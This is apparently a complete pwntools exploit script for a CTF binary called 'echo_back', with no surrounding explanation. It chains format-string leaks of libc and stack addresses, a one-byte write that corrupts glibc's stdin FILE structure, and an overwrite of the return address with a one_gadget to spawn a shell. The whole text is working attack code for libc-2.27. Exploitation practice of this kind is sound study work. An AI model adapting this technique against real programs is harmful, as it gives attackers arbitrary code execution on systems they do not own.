from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

if (DEBUG):
	context.log_level = "debug"

g_fname = "./echo_back"
g_elf = ELF(g_fname)
g_libcname = "./libc.so.6"

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote()
	g_libc = ELF(g_libcname)

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def getpid():
	if (LOCAL & DEBUG):
		log.info("pid: %d", g_io.proc.pid)
		pause()

def opt(idx):
	sa("choice>> ", str(idx))

def set_name(name):
	opt(1)
	sa("name:", name)

def echo_back(content):
	opt(2)
	sla("length:", "7")
	s(content)
	
def pwn():
	# 1st. leak __libc_start_main+231, to calc libc base and one_gadget echo_back(
	fmt_tmp = "%{off}$p\n"
	off1 = 19 # offset of "__libc_start_main+231"
	echo_back(fmt_tmp.format(off=off1))
	ru("anonymous say:")
	libc_base = int(rl()[:-1].decode(), 16) - 231 - 0x21b10 # libc-2.27
	one_gadget = libc_base + 0x4f3d5	# libc-2.27
	log.success("libc@%#x\none_gadget@%#x", libc_base, one_gadget)
	g_libc.address = libc_base
	
	# 2nd. leak stack address
	off2 = 21 # offset of __libc_argv
	echo_back(fmt_tmp.format(off=off2))
	ru("anonymous say:")
	addr_argv = int(rl()[:-1].decode(), 16)
	addr_ret = addr_argv - 0xe0
	log.success("argv=%#x\nreturn_addr@%#x", addr_argv, addr_ret)
	
	# 3rd. make _IO_stdin->_IO_buf_base &= ~0xff
	addr_stdin = g_libc.symbols["_IO_2_1_stdin_"]
	addr_buf_base = addr_stdin + 0x38	
	addr_org_base = addr_stdin + 0x83	# the default buf_base value
	log.success("_IO_stdin=%#x\n_IO_stdin->_IO_buf_base@%#x\ndefault value of _IO_stdin->_IO_buf_base=%#x", addr_stdin, addr_buf_base, addr_org_base)

	off3 = 16 # offset of the name we've set.
	set_name(p64(addr_buf_base))
	getpid()
	echo_back("%{off}$hhn".format(off=off3))
	
	# 4th. make _IO_stdin->_IO_buf_base = addr_ret via _IO_SYSREAD () in /libio/fileops.c:_IO_new_file_underflow(FILE *fp)
	payload = flat([
		0xfbad208b,	# remain original _flags' value
		p64(addr_org_base), p64(addr_org_base+1-0x83) , # _IO_read_ptr == _IO_read_end
		p64(addr_org_base)*4,
		addr_ret, # make _IO_buf_base = addr_ret
		addr_ret+8,
		# padding to &_IO_stdin->_shortbuf
		p64(0)*6, p64(0xffffffffffffffff), p16(0), "\0\n"
	])
	opt(2)
	sa("length:", payload)

	pause()
	sl("")

	opt(2)
	sa("length:", p64(one_gadget))

	log.info("ready to getshell!!")
	sl("")	
	pause()
	# 5th. exit to one_gadget and getshell.
	opt(3)

if "__main__" == __name__:
	pwn()
	g_io.interactive()
